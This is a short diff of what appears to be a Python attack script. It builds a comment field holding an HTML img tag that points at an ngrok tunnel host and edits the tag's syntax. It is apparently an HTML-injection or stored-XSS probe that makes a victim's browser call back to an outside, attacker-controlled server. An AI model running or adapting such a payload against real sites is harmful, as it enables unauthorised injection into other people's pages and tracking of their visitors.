@@ -4,7 +4,7 @@ import base64
 import http.client
 import urllib.parse
 
-payload = "<img src=http://monocotyledonous-jaqueline-archaically.ngrok-free.dev/>"
+payload = "<img src=http://monocotyledonous-jaqueline-archaically.ngrok-free.dev>"
 
 params = urllib.parse.urlencode({
     "comment": payload
